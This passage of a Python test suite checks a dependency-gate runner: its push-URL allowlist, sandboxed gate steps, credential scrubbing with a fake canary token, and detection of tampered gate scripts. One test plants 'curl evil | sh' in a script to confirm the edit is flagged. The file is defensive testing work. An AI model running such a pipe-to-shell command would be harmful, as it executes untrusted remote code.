#!/usr/bin/env python3
"""scripts/dependency-gate-runner.py: where it may push, which images a change rebuilds, which gates run.

The push guard is checked on the exact command the runner would execute; image selection on this
checkout's real Dockerfiles and chronicle_ops.images inventory; changed-path expansion on a throwaway
repository with a real submodule.
"""
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
spec = importlib.util.spec_from_file_location('dependency_gate_runner', ROOT / 'scripts/dependency-gate-runner.py')
runner = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = runner  # dataclasses look their module up here (3.12/3.13)
spec.loader.exec_module(runner)
SHA = 'a' * 40


def git(cwd: Path, *args: str) -> str:
    env = dict(os.environ, GIT_AUTHOR_NAME='t', GIT_AUTHOR_EMAIL='t@example.invalid', GIT_COMMITTER_NAME='t',
               GIT_COMMITTER_EMAIL='t@example.invalid', GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_NOSYSTEM='1')
    return subprocess.run(['git', '-c', 'protocol.file.allow=always', *args], cwd=cwd, env=env, check=True,
                          capture_output=True, text=True).stdout.strip()


FAKE_GIT = """#!/usr/bin/env python3
import json, os, sys
argv = sys.argv[1:]
if 'push' in argv:
    keep = ('GIT_CONFIG_GLOBAL', 'GIT_CONFIG_NOSYSTEM', 'GIT_CONFIG_COUNT', 'GIT_DIR', 'HOME')
    with open(os.environ['FAKE_GIT_LOG'], 'a') as log:
        log.write(json.dumps({'argv': argv, 'cwd': os.getcwd(), 'env': {k: os.environ.get(k) for k in keep}}) + '\\n')
    sys.exit(0)
os.execv(os.environ['FAKE_GIT_REAL'], ['git', *argv])
"""


class FakeGit:
    """A `git` first on PATH that records every push (argv, cwd, config environment) and runs real git otherwise.

    Beside it a `gh` that supplies no credential: push_env needs one on PATH to name as the credential helper,
    the recorded push never calls it, and the sandbox that runs these tests has no gh."""

    def __init__(self, directory: Path):
        self.bin = directory / 'fake-bin'
        self.bin.mkdir()
        (self.bin / 'git').write_text(FAKE_GIT)
        (self.bin / 'git').chmod(0o755)
        (self.bin / 'gh').write_text('#!/bin/sh\nexit 1\n')
        (self.bin / 'gh').chmod(0o755)
        self.log = directory / 'git-push.jsonl'
        self.saved = {}

    def __enter__(self):
        real = shutil.which('git')
        for key, value in (('PATH', f'{self.bin}{os.pathsep}{os.environ["PATH"]}'), ('FAKE_GIT_LOG', str(self.log)),
                           ('FAKE_GIT_REAL', real)):
            self.saved[key] = os.environ.get(key)
            os.environ[key] = value
        return self

    def __exit__(self, *exc):
        for key, value in self.saved.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value

    def pushes(self) -> list[dict]:
        return [json.loads(line) for line in self.log.read_text().splitlines()] if self.log.exists() else []


def repo_with_commit(base: Path, name: str = 'repo') -> tuple[Path, str]:
    repo = base / name
    repo.mkdir()
    git(repo, 'init', '-q', '-b', 'main')
    (repo / 'file').write_text('x\n')
    git(repo, 'add', '.')
    git(repo, 'commit', '-q', '-m', 'one')
    git(repo, 'tag', 'v1')
    return repo, git(repo, 'rev-parse', 'HEAD')


class PushGuardTests(unittest.TestCase):
    ALLOWED = 'https://github.com/uzaira0/methodic-dev.git'

    def test_refuses_public_and_upstream_repositories(self):
        for url in ('https://github.com/uzaira0/methodic.git', 'https://github.com/methodic-labs/chronicle-web.git',
                    'git@github.com:uzaira0/methodic-dev.git', 'https://github.com/uzaira0/methodic-dev.git.evil'):
            with self.subTest(url=url), self.assertRaises(SystemExit):
                runner.push_command(url, SHA, Path('/x.git'))

    def test_refuses_symbolic_refs(self):
        for ref in ('HEAD', 'main', 'refs/heads/main', SHA[:12], f'{SHA}:refs/heads/main'):
            with self.subTest(ref=ref), self.assertRaises(SystemExit):
                runner.push_command(self.ALLOWED, ref, Path('/x.git'))

    def test_the_push_reaches_only_the_validated_url_whatever_the_repository_config_says(self):
        """Extra pushurls, push.followTags, pushInsteadOf and a pushing remote name cannot widen the push."""
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory)
            repo, sha = repo_with_commit(base)
            for key, value in (('remote.origin.url', self.ALLOWED), ('remote.origin.pushurl', self.ALLOWED),
                               ('push.followTags', 'true'), ('push.recurseSubmodules', 'on-demand'),
                               ('url.https://github.com/uzaira0/methodic.git.pushInsteadOf', self.ALLOWED)):
                git(repo, 'config', '--add', key, value)
            git(repo, 'config', '--add', 'remote.origin.pushurl', 'https://github.com/uzaira0/methodic.git')
            work = base / 'work'
            work.mkdir()
            with FakeGit(base) as fake:
                runner.push(repo, sha, self.ALLOWED, work)
            pushes = fake.pushes()
            self.assertEqual(1, len(pushes), pushes)
            argv, env = pushes[0]['argv'], pushes[0]['env']
            self.assertEqual([self.ALLOWED, f'{sha}:refs/heads/deps/auto'], argv[-2:])
            self.assertIn('--no-follow-tags', argv)
            self.assertIn('--recurse-submodules=no', argv)
            self.assertNotIn('origin', argv)
            self.assertFalse([a for a in argv if a in ('-f', '--force', '--mirror', '--all', '--tags', '--follow-tags')
                              or a.startswith(('+', '--force'))])
            # Isolated configuration: no system config, a global config holding only the credential helper,
            # and a bare repository of the runner's own whose config carries none of the repository's settings.
            self.assertEqual('1', env['GIT_CONFIG_NOSYSTEM'])
            global_config = Path(env['GIT_CONFIG_GLOBAL']).read_text()
            self.assertNotIn('insteadOf', global_config)
            self.assertNotIn('pushurl', global_config)
            git_dir = Path(next(a for a in argv if a.startswith('--git-dir=')).split('=', 1)[1])
            self.assertNotEqual(git_dir.resolve(), (repo / '.git').resolve())
            local_config = (git_dir / 'config').read_text()
            for setting in ('pushurl', 'insteadOf', 'followTags', 'recurseSubmodules', 'methodic.git'):
                self.assertNotIn(setting, local_config)
            # The commit is reachable from that repository, so the real push sends exactly it.
            self.assertEqual('commit', subprocess.run(['git', f'--git-dir={git_dir}', 'cat-file', '-t', sha],
                                                      capture_output=True, text=True, check=True).stdout.strip())


class ImageSelectionTests(unittest.TestCase):
    def touched(self, *paths: str) -> list[str]:
        return runner.touched_images(ROOT, ROOT, list(paths))

    def test_go_module_bump_rebuilds_its_image(self):
        # backend copies its whole context (COPY . /app), so any root-repository file is one of its inputs.
        self.assertEqual(self.touched('selfhost/caddy/module/go.sum'), ['backend', 'caddy'])
        # backup's context is selfhost/ and it copies go-cron's module files; backend's archive has them too.
        self.assertEqual(self.touched('selfhost/backup-image/go-cron/go.sum'), ['backend', 'backup'])

    def test_web_lockfile_rebuilds_frontend_and_caddy_not_backend(self):
        self.assertEqual(sorted(self.touched('chronicle-web/bun.lock')), ['caddy', 'frontend'])

    def test_base_image_bump_rebuilds_that_dockerfile(self):
        self.assertIn('postgres', self.touched('selfhost/Dockerfile.postgres'))
        self.assertIn('grafana', self.touched('selfhost/Dockerfile.grafana'))

    def test_gradle_lockfile_rebuilds_backend(self):
        self.assertIn('backend', self.touched('chronicle-server/gradle.lockfile'))
        self.assertNotIn('frontend', self.touched('chronicle-server/gradle.lockfile'))

    def test_unrelated_submodule_rebuilds_nothing(self):
        self.assertEqual(self.touched('chronicle/app/gradle.lockfile'), [])

    def test_copy_sources_skip_other_stages_and_flags(self):
        with tempfile.TemporaryDirectory() as directory:
            dockerfile = Path(directory) / 'Dockerfile'
            dockerfile.write_text('FROM a AS b\nCOPY --chown=x:y one/ two \\\n  /dest/\nCOPY --from=b /x /y\nADD . /app\n')
            self.assertEqual(runner.copy_sources(dockerfile), ['one', 'two', '.'])


    def test_bind_mounted_build_context_files_are_sources(self):
        """The OS-package helpers reach the build through RUN --mount=type=bind (selfhost/os-packages/)."""
        with tempfile.TemporaryDirectory() as directory:
            dockerfile = Path(directory) / 'Dockerfile'
            dockerfile.write_text(
                'FROM a AS b\nRUN --mount=type=cache,target=/c true\n'
                'RUN --mount=type=bind,source=os-packages/apk-install-aged.sh,target=/usr/local/sbin/x.sh \\\n'
                '    sh /usr/local/sbin/x.sh v3.24\n'
                'RUN --mount=type=bind,from=b,source=/x,target=/y true\n'
                'RUN --mount=target=/z,type=bind,src=scripts/helper.sh true\n')
            self.assertEqual(runner.copy_sources(dockerfile), ['os-packages/apk-install-aged.sh', 'scripts/helper.sh'])

CANARY = 'ghp_canaryCanaryCanaryCanaryCanary0000'


class Environment:
    """Set environment variables for a block and restore them after."""

    def __init__(self, **values: str):
        self.values, self.saved = values, {}

    def __enter__(self):
        for key, value in self.values.items():
            self.saved[key] = os.environ.get(key)
            os.environ[key] = value
        return self

    def __exit__(self, *exc):
        for key, value in self.saved.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value


def robust_fetch_stub(base: Path) -> Path:
    library = base / 'lib'
    library.mkdir(exist_ok=True)
    (library / 'robust_fetch.py').write_text('')
    return library


class GateStepTests(unittest.TestCase):
    def steps(self, paths: list[str], tree: Path = ROOT) -> dict[str, runner.Step]:
        with tempfile.TemporaryDirectory() as directory, Environment(
                DOCKER_HOST='unix:///nonexistent.sock', ROBUST_FETCH_DIR=str(robust_fetch_stub(Path(directory))),
                CHRONICLE_DEPCHECK_DATA_DIR=str(Path(directory) / 'no-nvd')):
            work = Path(directory) / 'work'
            steps = runner.gate_steps(ROOT, tree, paths, work / 'logs', work, 'b' * 40)
        return {step.name: step for step in steps}

    def test_security_jobs_come_from_local_ci_without_a_second_age_run(self):
        jobs = runner.security_jobs(ROOT)
        self.assertIn('osv', jobs)
        self.assertIn('bun-audit', jobs)
        self.assertNotIn('dependency-age', jobs)

    def test_steps_follow_the_change(self):
        self.assertEqual(['age', 'python', 'tools', 'github', 'toolchain', 'scan', 'gradle', 'security', 'fuzz', 'web',
                          'images'],
                         list(self.steps(['chronicle-web/bun.lock'])))
        images = self.steps(['chronicle-web/bun.lock'])['images'].env
        self.assertEqual(sorted(images['CHRONICLE_IMAGE_GATE_COMPONENTS'].split()), ['caddy', 'frontend'])
        self.assertEqual(images['CHRONICLE_IMAGE_GATE_RUNTIME'], '0')
        self.assertEqual(self.steps(['toolchain-manifest.yaml'])['images'].env['CHRONICLE_IMAGE_GATE_RUNTIME'], '1')
        self.assertEqual(['age', 'python', 'tools', 'github', 'toolchain', 'scan', 'gradle', 'security', 'fuzz'],
                         list(self.steps(['chronicle/scripts/play-upload.requirements.txt'])))

    def test_host_steps_run_only_this_checkouts_scripts_and_dependency_code_runs_in_the_sandbox(self):
        steps = self.steps(['chronicle-web/bun.lock', 'toolchain-manifest.yaml'])
        for name in ('age', 'github', 'images'):
            command = steps[name].commands[0]
            self.assertFalse(steps[name].sandboxed)
            self.assertTrue(command[1].startswith(str(ROOT / 'scripts') + '/'), command)
        with tempfile.TemporaryDirectory() as directory:
            tree = Path(directory) / 'candidate'  # another path to a checkout, as the runner's clone is
            tree.symlink_to(ROOT)
            steps = self.steps(['chronicle-web/bun.lock'], tree)
        # The candidate is only the data: --root of the age gate and the source of the image builds.
        self.assertEqual(str(tree), steps['age'].commands[0][steps['age'].commands[0].index('--root') + 1])
        self.assertEqual(str(tree), steps['images'].env['CHRONICLE_IMAGE_GATE_SOURCE'])
        self.assertEqual(str(ROOT / 'scripts/check-dependency-age.py'), steps['age'].commands[0][1])
        networks = {}
        for name in ('python', 'tools', 'toolchain', 'scan', 'gradle', 'security', 'fuzz', 'web'):
            self.assertTrue(steps[name].sandboxed, name)
            for command in steps[name].commands:
                self.assertEqual(str(ROOT / 'scripts/deps-sandbox.sh'), command[1])
                self.assertIn(f'{ROOT / "scripts"}:/work/scripts:ro', command)
                self.assertIn(f'{ROOT / "tests"}:/work/tests:ro', command)
                self.assertEqual('gate', command[command.index('--image') + 1])
                networks.setdefault(name, []).append(command[command.index('--network') + 1])
        # Tests and builds get no network; installs and the scanners' databases only the allowlisted registries.
        self.assertEqual({'python': ['none', 'registries'], 'tools': ['registries'], 'toolchain': ['none'],
                          'scan': ['registries'], 'gradle': ['registries'], 'security': ['none'], 'fuzz': ['none'],
                          'web': ['registries', 'none']}, networks)

    def local_ci_jobs(self, command: list[str]) -> list[str]:
        return command[command.index('scripts/local-ci.sh') + 1:]

    def test_every_security_job_runs_once_and_only_database_lookups_get_a_network(self):
        steps = self.steps(['chronicle-web/bun.lock'])
        scan = self.local_ci_jobs(steps['scan'].commands[0])
        offline = self.local_ci_jobs(steps['security'].commands[0])
        fuzz = self.local_ci_jobs(steps['fuzz'].commands[0])
        self.assertEqual(sorted(runner.security_jobs(ROOT)), sorted(scan + offline + fuzz))
        # Online: scanners that query a live database and run only tools and this checkout's scripts.
        self.assertEqual(sorted(runner.ONLINE_JOBS), sorted(scan))
        # Jobs that build or test (dependency code) come after every scanner in their container.
        self.assertEqual(['engineering', 'gradle-depcheck'], offline[-2:])
        self.assertEqual(['fuzz'], fuzz)
        # Jazzer ships no linux/aarch64 native library: the fuzz step runs as linux/amd64.
        command = steps['fuzz'].commands[0]
        self.assertEqual('linux/amd64', command[command.index('--platform') + 1])

    def test_the_tool_directory_is_written_only_where_no_dependency_code_runs(self):
        steps = self.steps(['chronicle-web/bun.lock'])
        def tool_mounts(name):
            return [part for command in steps[name].commands for part in command
                    if re.fullmatch(r'/.+/gate-tools:/gate-tools(:ro)?', part)]
        self.assertEqual(1, len(tool_mounts('tools')))
        self.assertFalse(tool_mounts('tools')[0].endswith(':ro'))
        self.assertEqual(['gate-tools'], self.local_ci_jobs(steps['tools'].commands[0]))
        # The tools step runs no candidate Python: /gate-python is not mounted there.
        self.assertFalse(any('/gate-python' in part for part in steps['tools'].commands[0]))
        for name in ('scan', 'security', 'web'):
            self.assertTrue(tool_mounts(name), name)
            self.assertTrue(all(mount.endswith(':ro') for mount in tool_mounts(name)), name)
        for name in ('gradle', 'fuzz', 'python'):
            self.assertEqual([], tool_mounts(name), name)

    def test_the_tools_step_fetches_every_tool_an_offline_security_job_downloads(self):
        """A security job that downloads its tool at run time would fail with no network (and could write a
        tool where dependency code runs): local-ci's gate-tools job must fetch all of them first."""
        text = (ROOT / 'scripts/local-ci.sh').read_text()
        bodies = dict(re.findall(r'^job_([a-z_]+)\(\) \{\n(.*?)^\}', text, re.MULTILINE | re.DOTALL))
        def ensured(job: str, seen: set[str]) -> set[str]:
            name = job.replace('-', '_')
            if name in seen or name not in bodies:
                return set()
            seen.add(name)
            body = bodies[name]
            found = set(re.findall(r'\b(ensure_[a-z_]+)\b', body)) - {'ensure_dir'}
            for nested in re.findall(r'\brun_job ([a-z-]+)', body):
                found |= ensured(nested, seen)
            return found
        needed = set()
        for job in runner.security_jobs(ROOT) + ['web']:
            needed |= ensured(job, set())
        self.assertIn('ensure_grype', needed)
        self.assertLessEqual(needed, ensured('gate-tools', set()))
        self.assertIn('db update', bodies['gate_tools'])

    def test_steps_that_check_python_tooling_see_robust_fetch_read_only(self):
        steps = self.steps(['chronicle-web/bun.lock'])
        for name in ('toolchain', 'security'):
            command = steps[name].commands[0]
            self.assertTrue(any(re.fullmatch(r'/.+/robust_fetch\.py:/robust-fetch/robust_fetch\.py:ro', part)
                                for part in command), name)
            self.assertIn('ROBUST_FETCH_DIR=/robust-fetch', command)

    def test_github_lookups_are_read_by_the_sandbox_and_made_by_this_checkout(self):
        steps = self.steps(['chronicle-web/bun.lock'])
        scan = steps['scan'].commands[0]
        self.assertTrue(any(re.fullmatch(r'/.+/github-api:/github-api:ro', part) for part in scan))
        self.assertIn('CHRONICLE_GITHUB_API_CACHE=/github-api', scan)
        github = steps['github']
        self.assertEqual([str(ROOT / 'scripts/deps-freshness.sh'), '--fetch-github'], github.commands[0][1:3])
        self.assertEqual(ROOT, github.cwd)  # not the candidate's checkout, whose git remotes gh would read

    def test_the_candidates_python_tooling_is_installed_from_hashes_into_a_read_only_mount(self):
        """verify-toolchain.sh and the security jobs need requirements-dev.txt installed; the gate installs the
        candidate's pins (wheels only, every hash checked) into a fresh directory the later steps see read-only."""
        steps = self.steps(['requirements-dev.txt'])
        create, install = steps['python'].commands
        self.assertEqual(['uv', 'venv'], create[create.index('--') + 1:][:2])
        tail = install[install.index('--') + 1:]
        for flag in ('--require-hashes', '--only-binary', ':all:', 'requirements-dev.txt'):
            self.assertIn(flag, tail)
        for command in (create, install):
            mounts = [command[i + 1] for i, part in enumerate(command) if part == '--mount']
            self.assertTrue(any(re.fullmatch(r'/.+/gate-python:/gate-python', mount) for mount in mounts), mounts)
        for name in ('toolchain', 'security'):
            self.assertTrue(any(re.fullmatch(r'/.+/gate-python:/gate-python:ro', part) for part in steps[name].commands[0]),
                            name)
        dockerfile = (ROOT / 'scripts/sandbox/Dockerfile.gate').read_text()
        self.assertRegex(dockerfile, r'PATH=/gate-python/bin:')
        allowlist = (ROOT / 'scripts/sandbox/egress-allowlist.txt').read_text().split()
        self.assertIn('pypi.org', allowlist)
        self.assertIn('files.pythonhosted.org', allowlist)

    def test_steps_are_planned_where_no_docker_client_is_installed(self):
        """The engineering job runs these tests inside the sandbox, which has no docker CLI: planning the steps
        must not need one (the plugin directories are then empty)."""
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory)
            (base / 'empty-bin').mkdir()
            with Environment(PATH=str(base / 'empty-bin'), DOCKER_HOST='unix:///nonexistent.sock',
                             ROBUST_FETCH_DIR=str(robust_fetch_stub(base))):
                env = runner.host_env(base / 'work', 'b' * 40)
            config = json.loads((Path(env['DOCKER_CONFIG']) / 'config.json').read_text())
        self.assertEqual({'cliPluginsExtraDirs': []}, config)

    def test_a_host_step_environment_holds_no_credential_and_an_empty_home(self):
        """Run a real process with the environment a host step gets, from a parent that holds every credential."""
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory)
            home = base / 'home'
            (home / '.docker').mkdir(parents=True)
            (home / '.docker/config.json').write_text(json.dumps({'auths': {'ghcr.io': {'auth': CANARY}}}))
            with Environment(GH_TOKEN=CANARY, GHCR_TOKEN=CANARY, GITHUB_TOKEN=CANARY, SSH_AUTH_SOCK=f'/{CANARY}',
                             DOCKER_CONFIG=str(home / '.docker'), SIGNING_KEY_PATH=f'/{CANARY}',
                             CHRONICLE_RELEASE_SIGNING_KEY=f'/{CANARY}', NVD_API_KEY=CANARY, HOME=str(home),
                             DOCKER_HOST='unix:///nonexistent.sock', ROBUST_FETCH_DIR=str(robust_fetch_stub(base))):
                env = runner.host_env(base / 'work', 'b' * 40)
            probe = ('import json, os, pathlib, sys\n'
                     'home = pathlib.Path(os.environ["HOME"])\n'
                     'config = json.loads((pathlib.Path(os.environ["DOCKER_CONFIG"]) / "config.json").read_text())\n'
                     'print(json.dumps({"env": dict(os.environ), "home": sorted(p.name for p in home.iterdir()),'
                     ' "docker": sorted(config)}))\n')
            seen = json.loads(subprocess.run([sys.executable, '-c', probe], env=env, capture_output=True, text=True,
                                             check=True).stdout)
        self.assertNotIn(CANARY, json.dumps(seen['env']))
        for name in ('SSH_AUTH_SOCK', 'GH_TOKEN', 'GHCR_TOKEN', 'SIGNING_KEY_PATH', 'NVD_API_KEY'):
            self.assertNotIn(name, seen['env'])
        self.assertNotEqual(str(home), seen['env']['HOME'])
        self.assertEqual([], seen['home'])
        self.assertEqual(['cliPluginsExtraDirs'], seen['docker'])


def commit_all_files(repo: Path, message: str = 'c') -> str:
    git(repo, 'add', '-A')
    git(repo, 'commit', '-q', '-m', message)
    return git(repo, 'rev-parse', 'HEAD')


class ProtectedPathTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.base_dir = Path(self.directory.name)
        web = self.base_dir / 'web-src'
        web.mkdir()
        git(web, 'init', '-q', '-b', 'main')
        (web / 'package.json').write_text(json.dumps({'name': 'web', 'scripts': {'check': 'tsc'},
                                                      'dependencies': {'left-pad': '1.3.0'}}, indent=2))
        (web / 'bunfig.toml').write_text('[install]\nminimumReleaseAge = 604800\n')
        commit_all_files(web)
        self.tree = self.base_dir / 'tree'
        self.tree.mkdir()
        git(self.tree, 'init', '-q', '-b', 'main')
        files = {
            'scripts/check-dependency-age.py': 'print("gate")\n',
            'scripts/flyway-migrate.sh': f'FLYWAY_IMAGE="flyway/flyway:11.1@sha256:{"a" * 64}"\nrun "$FLYWAY_IMAGE"\n',
            'tests/quality/test_x.py': 'x = 1\n',
            'renovate.json': '{}\n',
            'toolchain-manifest.yaml': 'bun: "1.4.4"\ngate_tools:\n  grype:\n    version: "0.1.0"\nsemgrep: "1.0"\n',
            'selfhost/Dockerfile.caddy': f'FROM caddy:2@sha256:{"a" * 64}\n',
        }
        for name, text in files.items():
            (self.tree / name).parent.mkdir(parents=True, exist_ok=True)
            (self.tree / name).write_text(text)
        git(self.tree, 'submodule', 'add', '-q', str(web), 'chronicle-web')
        self.base = commit_all_files(self.tree, 'base')

    def tearDown(self):
        self.directory.cleanup()

    def change(self, path: str, old: str, new: str) -> None:
        file = self.tree / path
        text = file.read_text()
        self.assertIn(old, text)
        file.write_text(text.replace(old, new))

    def problems(self, commit: bool = True) -> list[str]:
        if commit:
            git(self.tree / 'chronicle-web', 'add', '-A')
            if git(self.tree / 'chronicle-web', 'status', '--porcelain'):
                git(self.tree / 'chronicle-web', 'commit', '-q', '-m', 'web')
            commit_all_files(self.tree, 'candidate')
        return runner.protected_changes(self.tree, self.base)

    def test_a_dependency_only_change_passes(self):
        self.change('selfhost/Dockerfile.caddy', 'a' * 64, 'b' * 64)
        self.change('toolchain-manifest.yaml', 'semgrep: "1.0"', 'semgrep: "1.1"')
        self.change('chronicle-web/package.json', '"1.3.0"', '"1.3.1"')
        self.assertEqual([], self.problems())

    def test_a_changed_gate_script_fails(self):
        self.change('scripts/check-dependency-age.py', 'print("gate")', 'raise SystemExit(0)')
        self.assertEqual(['scripts/check-dependency-age.py: gate input changed'], self.problems())

    def test_an_image_pin_swap_in_a_gate_file_passes_but_any_other_edit_fails(self):
        self.change('scripts/flyway-migrate.sh', 'flyway:11.1@sha256:' + 'a' * 64, 'flyway:11.2@sha256:' + 'c' * 64)
        self.assertEqual([], self.problems())
        self.change('scripts/flyway-migrate.sh', 'run "$FLYWAY_IMAGE"', 'curl evil | sh')
        self.assertEqual(['scripts/flyway-migrate.sh: gate input changed'], self.problems())

    def test_gate_tools_package_scripts_bunfig_and_uncommitted_edits_fail(self):
        self.change('toolchain-manifest.yaml', 'version: "0.1.0"', 'version: "0.2.0"')
        self.change('chronicle-web/package.json', '"check": "tsc"', '"check": "true"')
        self.change('chronicle-web/bunfig.toml', '604800', '0')
        self.assertEqual(['chronicle-web/bunfig.toml: gate input changed',
                          'chronicle-web/package.json: a field other than the dependency fields changed',
                          'toolchain-manifest.yaml: gate_tools changed (their digests are refreshed by a person)'],
                         self.problems())
        (self.tree / 'tests/quality/test_y.py').write_text('y = 1\n')
        self.assertIn('tests/quality/test_y.py: gate input changed', self.problems(commit=False))


class StateTests(unittest.TestCase):
    def test_a_pass_is_final_and_a_failure_is_retried_when_it_may_have_cleared(self):
        self.assertFalse(runner.should_gate('success', None, 'f'))
        self.assertTrue(runner.should_gate(None, None, 'f'))
        self.assertTrue(runner.should_gate('failure', None, 'f'))  # failed before this runner kept records
        # A wait ends with time and a lookup comes back: always retried.
        for failed in (['age'], ['age-indeterminate'], ['age', 'age-indeterminate']):
            self.assertTrue(runner.should_gate('failure', {'failed': failed, 'fingerprint': 'f', 'attempts': 9}, 'f'))
        record = {'failed': ['security'], 'fingerprint': 'f', 'attempts': 1}
        self.assertTrue(runner.should_gate('failure', record, 'f'))
        self.assertFalse(runner.should_gate('failure', dict(record, attempts=runner.MAX_ATTEMPTS), 'f'))
        # The gates or the trusted base changed: the old result says nothing.
        self.assertTrue(runner.should_gate('failure', dict(record, attempts=runner.MAX_ATTEMPTS), 'g'))

    def test_attempts_count_per_fingerprint(self):
        with tempfile.TemporaryDirectory() as directory, Environment(
                CHRONICLE_DEPENDENCY_GATE_STATE=str(Path(directory) / 'state.json')):
            runner.record_result('r@1', ['security'], 'f')
            runner.record_result('r@1', ['security'], 'f')
            self.assertEqual(2, runner.load_state()['candidates']['r@1']['attempts'])
            runner.record_result('r@1', ['security'], 'g')
            self.assertEqual(1, runner.load_state()['candidates']['r@1']['attempts'])

    def test_the_trusted_base_is_recorded_or_contained_never_just_the_remote_tip(self):
        with tempfile.TemporaryDirectory() as directory:
            root, first = repo_with_commit(Path(directory))
            (root / 'file').write_text('y\n')
            second = commit_all_files(root)
            git(root, 'checkout', '-q', '--detach', first)
            (root / 'other').write_text('pushed by someone else\n')
            foreign = commit_all_files(root)
            git(root, 'checkout', '-q', second)
            self.assertEqual(first, runner.trusted_base(root, {}, first))  # this checkout contains it
            self.assertEqual(foreign, runner.trusted_base(root, {'trusted_base': foreign}, foreign))  # recorded
            # Moved by something else: gate against the recorded base, so the diff covers the move.
            self.assertEqual(first, runner.trusted_base(root, {'trusted_base': first}, foreign))
            with self.assertRaises(SystemExit):
                runner.trusted_base(root, {}, foreign)


FAKE_GH = """#!/usr/bin/env python3
import json, os, sys
with open(os.environ['FAKE_GH_LOG'], 'a') as log:
    log.write(json.dumps(sys.argv[1:]) + '\\n')
if sys.argv[1:3] == ['api', 'repos/x']:
    print('[]')
"""


class GateFlowTests(unittest.TestCase):
    """gate_branch end to end on a throwaway checkout, with stand-in gate scripts in that checkout."""

    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.base_dir = Path(self.directory.name)
        self.root = self.base_dir / 'root'
        self.root.mkdir()
        git(self.root, 'init', '-q', '-b', 'main')
        (self.root / '.gitmodules').write_text('')
        self.markers = self.base_dir / 'markers'
        self.markers.mkdir()
        for name in ('check-dependency-age.py', 'deps-regenerate.py'):
            self.stub(name, 'candidate', 0)
        (self.root / 'pins.txt').write_text('a==1\n')
        self.base = commit_all_files(self.root, 'base')
        (self.root / 'pins.txt').write_text('a==2\n')
        self.candidate = commit_all_files(self.root, 'renovate')
        self.work = self.base_dir / 'work'
        self.env = Environment(DOCKER_HOST='unix:///nonexistent.sock',
                               ROBUST_FETCH_DIR=str(robust_fetch_stub(self.base_dir)),
                               CHRONICLE_DEPENDENCY_GATE_STATE=str(self.base_dir / 'state.json'),
                               CHRONICLE_DEPCHECK_DATA_DIR=str(self.base_dir / 'no-nvd'))
        self.env.__enter__()
        self.saved_steps = runner.gate_steps

    def tearDown(self):
        runner.gate_steps = self.saved_steps
        self.env.__exit__()
        self.directory.cleanup()

    def stub(self, name: str, label: str, code: int) -> None:
        """scripts/<name> that leaves a marker naming whose copy ran, then exits with code."""
        path = self.root / 'scripts' / name
        path.parent.mkdir(exist_ok=True)
        path.write_text(f'from pathlib import Path\nPath({str(self.markers)!r}, "{name}-{label}").touch()\n'
                        f'raise SystemExit({code})\n')

    def ran(self) -> list[str]:
        return sorted(p.name for p in self.markers.iterdir())

    def test_the_gate_runs_this_checkouts_scripts_not_the_candidates(self):
        # The candidate commit carries the 'candidate' stubs; this checkout's working tree holds the trusted ones.
        self.stub('check-dependency-age.py', 'trusted', 1)
        failed = runner.gate_branch(self.root, self.work, runner.ROOT_REPO, 'renovate/a', self.candidate, self.base,
                                    True, local=True)
        self.assertEqual(['age'], failed)
        self.assertEqual(['check-dependency-age.py-trusted'], self.ran())

    def test_the_candidate_clone_holds_only_the_candidates_history(self):
        """Full-history scanners (gitleaks walks every ref) see the candidate, not the checkout's other branches."""
        git(self.root, 'checkout', '-q', '-b', 'unrelated')
        (self.root / 'other.txt').write_text('another branch\n')
        unrelated = commit_all_files(self.root, 'work on another branch')
        git(self.root, 'tag', 'unrelated-tag', unrelated)
        git(self.root, 'checkout', '-q', 'main')
        git(self.root, 'tag', '-a', '-m', 'release', '2026.1.1', self.base)  # on the candidate's history
        tree = self.work / 'candidate'
        runner.prepare(self.root, tree, self.candidate, None, self.base_dir / 'git.log')
        reachable = git(tree, 'log', '--all', '--format=%H').split()
        self.assertIn(self.candidate, reachable)
        self.assertIn(self.base, reachable)
        self.assertNotIn(unrelated, reachable)
        self.assertEqual(self.candidate, git(tree, 'rev-parse', 'HEAD'))
        self.assertEqual(['refs/tags/2026.1.1'], git(tree, 'for-each-ref', '--format=%(refname)').split())
        self.assertTrue(git(tree, 'describe', '--tags').startswith('2026.1.1-'))

    def test_a_candidate_that_changes_a_gate_runs_nothing(self):
        (self.root / 'scripts/check-dependency-age.py').write_text('raise SystemExit(0)\n')
        evil = commit_all_files(self.root, 'renovate edits the gate')
        failed = runner.gate_branch(self.root, self.work, runner.ROOT_REPO, 'renovate/b', evil, self.base, True,
                                    local=True)
        self.assertEqual(['protected'], failed)
        self.assertEqual([], self.ran())

    def test_a_passing_candidate_is_pushed_once_to_deps_auto_and_becomes_the_trusted_base(self):
        runner.gate_steps = lambda *args: []
        with FakeGit(self.base_dir) as fake:
            (fake.bin / 'gh').write_text(FAKE_GH)
            (fake.bin / 'gh').chmod(0o755)
            with Environment(FAKE_GH_LOG=str(self.base_dir / 'gh.jsonl')):
                failed = runner.gate_branch(self.root, self.work, runner.ROOT_REPO, 'renovate/a', self.candidate,
                                            self.base, False, local=True)
        self.assertEqual([], failed)
        self.assertEqual(['check-dependency-age.py-candidate', 'deps-regenerate.py-candidate'], self.ran())
        pushes = fake.pushes()
        self.assertEqual(1, len(pushes), pushes)
        self.assertEqual(['https://github.com/uzaira0/methodic-dev.git', f'{self.candidate}:refs/heads/deps/auto'],
                         pushes[0]['argv'][-2:])
        posts = [json.loads(line) for line in (self.base_dir / 'gh.jsonl').read_text().splitlines()]
        self.assertEqual(1, len(posts))
        self.assertIn('state=success', posts[0])
        self.assertEqual(self.candidate, runner.load_state()['trusted_base'])


class ChangedPathTests(unittest.TestCase):
    def test_submodule_contents_are_expanded(self):
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory)
            sub = base / 'sub-src'
            sub.mkdir()
            git(sub, 'init', '-q', '-b', 'main')
            (sub / 'bun.lock').write_text('old\n')
            git(sub, 'add', '.')
            git(sub, 'commit', '-q', '-m', 'sub')
            root = base / 'root'
